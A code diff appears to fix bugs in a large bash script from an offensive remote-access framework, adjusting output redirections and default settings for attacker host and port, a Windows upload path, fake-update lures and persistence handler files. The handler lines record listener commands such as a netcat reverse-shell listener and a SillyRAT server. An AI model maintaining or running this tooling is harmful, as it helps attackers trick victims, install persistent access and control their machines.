@@ -10277,13 +10277,13 @@ if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload 
 
 random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
-wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$SOSP" ]; then SOSP="windows";fi
 if [ -z "$Drop" ]; then Drop="Procmom";fi
+wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
 if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
    uploadpath="$rpath => ($wvd)"
@@ -10535,9 +10535,9 @@ sleep 2
 dtr=$(date|awk {'print $1,$2,$3,$4'})
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    : $lport" >> $IPATH/output/persistence.handler
+   echo "LPORT    : $lport" > $IPATH/output/persistence.handler
    echo "LHOST    : $lhost" >> $IPATH/output/persistence.handler
-   echo "ACTIVE_ON: $dtr" > $IPATH/output/persistence.handler
+   echo "ACTIVE_ON: $dtr" >> $IPATH/output/persistence.handler
    echo "HANDLER  : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence.handler
    echo "HANDLER  : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence.handler
    echo "+-----------------------------------------+" >> $IPATH/output/persistence.handler
@@ -12936,7 +12936,7 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    :$lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT    :$lport" > $IPATH/output/persistence_ID_$random_name.handler
    echo "LHOST    :$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "ACTIVE_ON:$dtr" >> $IPATH/output/persistence_ID_$random_nafme.handler
    echo "HANDLER  :cd output" >> $IPATH/output/persistence_ID_$random_name.handler
@@ -13172,7 +13172,7 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "LPORT    :$lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT    :$lport" > $IPATH/output/persistence_ID_$random_name.handler
    echo "LHOST    :$lhost" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "ACTIVE_ON:$dtr" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "HANDLER  :sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
